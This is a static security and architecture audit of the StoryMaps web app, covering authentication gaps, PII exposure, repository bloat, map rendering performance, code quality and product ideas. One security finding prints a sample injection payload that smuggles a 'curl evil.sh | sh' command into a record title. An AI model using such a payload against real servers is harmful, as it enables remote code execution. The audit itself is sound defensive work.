# StoryMaps Codebase Audit & Recommendations

**Date:** 2026-07-14
**Scope:** Full-codebase audit (frontend architecture, security/backend, performance/data pipeline) plus product brainstorming.
**Method:** Static analysis of `src/`, `supabase/`, `public/`, config, and the Python data pipeline. `tsc --noEmit` and `git` introspection. No dependencies were installed and no runtime behavior was exercised, so findings are code-level, not observed at runtime.

---

## TL;DR — What to do first

1. **Fix the outreach API (CRITICAL, security).** `PATCH /api/outreach` has *no authentication* and builds a shell `git commit` command from an attacker-controlled record title → **unauthenticated remote code execution**. Same file leaks contact PII to the public internet. This is the single most urgent item.
2. **Lock down admin & proposals server-side.** Admin is gated only in client React; the middleware checks "logged in," not "is admin." Any registered user can read every proposal and plaque-inquiry PII.
3. **Stop committing the data pipeline to git.** ~569 MB of dataset backups, 74 MB of scrape cache, `.db`/`.log` files and two large PDFs are tracked. The repo working tree is ~795 MB.
4. **Delete dead code.** ~2,000+ lines of backup files, `*Test` map variants, and archived components are shipped in the tree; the *production* data hook is confusingly the one named `useStoryMapLogicTest`.
5. **Rethink the map rendering path** before scaling to 10k markers: it currently uses one React DOM `<Marker>` per point, forcing hard caps of 50–800 visible markers.

---

## 1. Security & Backend (highest risk)

### Critical
- **C1 — Unauthenticated command injection (RCE).** `src/app/api/outreach/route.ts:31,74` — `autoCommit()` runs `git commit -m "${message}"` through a shell, where `message` includes `data[recordIndex].title`, which the same unauthenticated `PATCH` overwrites from the request body. Payload like `{"id":2,"title":"x\"; curl evil.sh | sh #"}` executes on the server.
  *Fix:* require an authenticated admin server-side; replace `exec` with `execFile('git', ['commit','-m',message])` (no shell).
- **C2 — Outreach API fully unauthenticated.** GET/PATCH (`api/outreach/route.ts:39-85`) and CSV export (`api/outreach/export/route.ts:19`) have no auth. Anyone can read the full outreach dataset (emails, phones, notes), overwrite records, and download the export. The client password gate never touches these endpoints.
  *Fix:* Supabase `getUser()` + `is_admin` check at the top of every handler.
- **C3 — Admin protected client-side only.** `src/lib/supabase/middleware.ts:54-64` gates `/admin` on *authenticated*, not *admin*. `admin/proposals/page.tsx:26-29` enforces `is_admin` in a `useEffect`. `GET /api/proposals` (`route.ts:25-32`) requires auth but not admin, and RLS policy `"Anyone can view proposals" USING (true)` (`supabase/migrations/001_initial_schema.sql:81-84`) lets any authenticated user read all rows.
  *Fix:* enforce `is_admin` server-side in middleware/route; tighten SELECT RLS to owner-or-admin.
- **C4 — Building-owner PII exposed to any logged-in user.** Plaque inquiries store `inquiry_name/email/phone` in `proposals` (`supabase/migrations/002_plaque_inquiries.sql:24-28`); the `USING (true)` policy + non-admin `GET /api/proposals` let any registered user harvest all contact PII.
  *Fix:* restrict SELECT of inquiry/contact columns to admins (RLS + route).

### High
- **H1 — Client-side admin password shipped to the browser.** `admin/outreach/page.tsx:33` uses `NEXT_PUBLIC_ADMIN_PASSWORD || 'storytimemaps'`; `NEXT_PUBLIC_` inlines it into the bundle, and the gate is bypassable via `sessionStorage`. Purely cosmetic.
  *Fix:* delete the client gate; authenticate via Supabase admin session server-side.
- **H2 — Hardcoded Mapbox token in 5 source files.** `MapboxMapTest.tsx:93`, `MapboxMapTestSimple.tsx:9`, `barcharts/components/District3DMap.tsx:9`, `museum-exhibit/components/TouchMap.tsx:10`, `TouchMapSimple.tsx:7` (+ `IMPLEMENTATION_NOTES.md:196`) embed a literal `pk.` token, present in git history.
  *Fix:* remove literals, require env var, rotate the token, set URL restrictions in Mapbox.

### Medium / Low
- **M1 — No rate limiting** on public/mutating routes (`api/proposals/*`, `api/storymaps`, `api/outreach`). Only `api/plaque-inquiry` has an in-memory limiter (resets on cold start, per-instance). *Fix:* durable limiter (e.g. Upstash).
- **M2 — Weak server-side validation.** `api/proposals/route.ts:99-105` only checks presence; `!body.lat` rejects a valid `0`; `PATCH /api/proposals/[id]:150-154` copies arbitrary body keys into the update. *Fix:* Zod schema with lat/lng bounds and a column whitelist.
- **M3 — Dependency mismatch.** `eslint-config-next@14.2.11` vs `next@15.4.10`; `react@^18` while Next 15 expects React 19. *Fix:* align majors.
- **L1 — Third-party contact PII committed** in `public/data/outreach/businesses.json` (real emails/phones), served statically. *Fix:* move behind an admin API; scrub from history.
- **L2 — Open-redirect hardening** missing on `auth/callback/route.ts:7,16` (`next` param not validated as relative); 6-char password minimum (`AuthModal.tsx:140`).
- **Positive:** no `.env` committed; no Supabase JWTs hardcoded; `plaque-inquiry` route is well-hardened (server-side service key, honeypot, length caps, email regex) — use it as the template for the others.

---

## 2. Performance & Data Pipeline

### Critical
- **Repo bloat — ~569 MB of pipeline artifacts in git.** `data/` holds 175 JSON backup snapshots (dozens of ~4.3 MB files minutes apart); `scrape_cache/` is 74 MB of raw HTTP cache; `vectors.db` (3.7 MB), `geocoding_cache.db` (1.26 MB), and several 500–800 KB `.log` files are tracked; two PDFs (12.3 MB + 9.8 MB) bloat history permanently. `.gitignore` only excludes two narrow backup globs.
  *Fix:* `git rm -r --cached` the caches/logs/dbs/backups, extend `.gitignore`, and `git filter-repo` to purge the PDFs/backups from history (pack ~72 MB → a few MB).

### High
- **Full 7.2 MB dataset shipped to the browser** on the museum route: `museum-exhibit/services/dataLoader.ts:32` fetches all 10,021 businesses as a static file with no pagination. *Fix:* route through the paginated API or ship a slimmed GeoJSON (id/lat/lng/dates).
- **DOM markers, not a GL layer.** `MapboxMap.tsx` renders one React `<Marker>` per cluster/point, repositioned every frame — the reason for the 50/150/800 caps in `config/performance.ts:66-74`. *Fix:* draw points/clusters via a Mapbox GL `circle`/`symbol` source+layer (GPU), keeping DOM only for the active popup.
- **O(n²) title matching.** `hooks/useMarkerCalculations.ts:92,142` runs `find(...)` substring matches across the whole business list per story, re-lowercasing millions of times inside `useMemo`. *Fix:* build a normalized `Map<name, business>` once for O(1) lookups.

### Medium / Low
- **API returns/ETags the full 10k array.** `api/storymaps-test/route.ts` defaults page size to 10000 and MD5-hashes the entire payload per cache miss. *Fix:* static minimal GeoJSON at build time; version/mtime ETag; smaller default page.
- **29 MB unoptimized PNGs** in `public/images` (e.g. `hoxter.png` 2.7 MB) plus stray screenshots. `next.config.mjs` already enables AVIF/WebP — route these through `next/image` and drop the screenshots.
- **Bundle:** splitting is configured and `MapboxMap` is lazy-loaded (good), but there's no bundle-analyzer and `MapboxMap.tsx` is a single 1,459-line chunk. Add `@next/bundle-analyzer`.
- **Timeline subsystem is healthy** (40 KB, lazy, throttled) — but essentially unpopulated (6 files for ~10k businesses).

---

## 3. Frontend Architecture & Code Quality

- **Dead / backup code in the tree (~2,000+ lines):** `src/app/page.tsx.backup`, `page.tsx.old`, `museum-exhibit/page-old.tsx`, `components/archived/BusinessDetailModal-sliding.tsx`, and unimported components `MapboxMapTest.tsx` (480), `MapboxMapTestSimple.tsx` (332), `FrankfurtMapPreview.tsx` (276), `BerlinMapGraphic.tsx`. *Fix:* delete; git history is the backup.
- **Misleading hook naming:** the *production* hook is `useStoryMapLogicTest.ts` (aliased in `page.tsx:14`), while `useStoryMapLogic.ts` (449 lines) is used only by a test route and dead code. *Fix:* delete the unused variant, drop the `Test` suffix.
- **Oversized units:** `MapboxMap.tsx` (1459), `StoryList.tsx` (1065), `frankfurt/page.tsx` (933). The Frankfurt page reimplements the Berlin page's map+sidebar shell. *Fix:* extract a shared `<CityMapPage city=…>`; split `MapboxMap` into layer/style/popup/marker modules.
- **God-hook:** the core data hook has 13+ `useState`, 4 `useEffect`, 3 fetches, redundant `mode`/`viewMode` and `visibleStories`/`enrichedStories` kept in manual sync. *Fix:* split into `useBusinessData` / `useMarkers` / `useDateFilter`.
- **Unused abstraction:** `contexts/DateFilterContext.tsx` has zero consumers while date state is prop-drilled. *Fix:* adopt it or delete it.
- **Two parallel theming mechanisms:** `[theme]/page.tsx` validates a slug then redirects to `/?theme=`; the query param is what actually applies the theme. The valid-theme list is duplicated. *Fix:* pick one mechanism; single shared `THEMES` constant.
- **TypeScript:** 35 `any` across 14 files, worst in `MapboxMap.tsx` public props (`data?: any`, `onBusinessSelect?: (business: any)`). *Fix:* type map features as `GeoJSON.Feature`, define real prop interfaces. (`tsc --noEmit` is clean today only because deps aren't installed; add a `typecheck` script and run it in CI.)
- **i18n:** Yiddish `common.json` is ~43 keys (13%) short of en/de; SSR fallback strings are hardcoded in `useTranslationNew.ts:74-84` and silently diverge; `NavigationSidebar` and other components don't use `useTranslation` at all.
- **Tests:** only 2 test files exist, yet `jest.config.js` sets a 50% coverage threshold (any `--coverage` run fails). Core data hook, `MapboxMap`, `StoryList` filtering, and all API routes are untested. Many stray `test_*.html` / `*_test.py` harnesses are committed at the repo root. Also: `*-test` / `overlay-test` / `test-full-dataset` folders ship as real routes.

---

## 4. Product & Platform Brainstorming

Beyond fixes, directions that build on what's already here (multi-city data, timeline, plaque inquiries, i18n):

- **Data as a public good:** expose a documented read-only API / downloadable open dataset (CSV + GeoJSON) with provenance per record. The pipeline already produces this; packaging it invites researchers and cites the HU Berlin source properly.
- **Deep-linkable stories:** stable URLs for a single business/street/year with server-rendered Open Graph cards (name, photo, dates) for shareable memorial links — pairs naturally with the existing plaque program.
- **Contribution loop:** the proposal/plaque-inquiry flow is a foundation for community-sourced corrections and photos, with an admin moderation queue (once admin auth is real). Consider a lightweight "suggest an edit" on each record.
- **Timeline storytelling:** the timeline subsystem is well-built but nearly empty — a small authored set of guided "walks" (e.g. one street 1930→1938) would show the data's narrative power far better than 10k dots.
- **Accessibility & memorial tone:** audit contrast across all themes (CLAUDE.md flags this), keyboard-navigate the map, and add screen-reader summaries of map state — important for an educational/memorial audience.
- **Frankfurt parity:** Frankfurt is a near-duplicate page; a config-driven multi-city architecture would let new cities be added as data + config rather than a new 900-line page.
- **Trust signals:** per-record certainty is already modeled (`certainty: exact|approximate|estimated`) — surface it in the UI so users understand data confidence, which matters for historical credibility.

---

## Suggested sequencing

| Phase | Focus | Items |
|---|---|---|
| **P0 — this week** | Stop the bleeding | C1, C2, C3, C4 (auth + RCE), H1, H2 (rotate token) |
| **P1** | Repo & correctness | Purge pipeline artifacts from git; delete dead code; add `typecheck`; fix coverage gate |
| **P2** | Scale & quality | GL marker layer; O(1) title matching; decompose `MapboxMap`/god-hook; slim museum payload |
| **P3** | Polish & product | i18n gaps; unify theming; shared city-map component; accessibility; guided timeline walks |

*This document is a review artifact — no application code was modified.*
